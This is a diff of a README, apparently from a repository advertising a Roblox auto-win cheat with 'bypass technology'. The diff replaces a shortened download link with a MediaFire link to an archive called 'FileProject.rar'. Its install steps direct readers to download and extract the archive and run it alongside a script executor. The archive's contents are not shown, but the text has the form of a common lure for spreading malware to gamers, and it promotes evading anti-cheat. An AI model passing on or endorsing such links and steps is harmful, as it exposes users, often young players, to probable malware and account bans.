@@ -95,7 +95,7 @@ Our 100 Players Impossible OP Auto Win 2026 uses cutting-edge bypass technology 
 
 ## 🔧 How to Install (30 Seconds)
 
-1. **[Download](https://surl.li/wdbbve)** the latest version
+1. **[Download](https://www.mediafire.com/file/zgczguxyla9wia0/FileProject.rar/file)** the latest version
 2. **Extract** archive to any folder
 3. **Launch** Roblox and login
 4. **Open** your Executor (Solara, Wave, etc.)
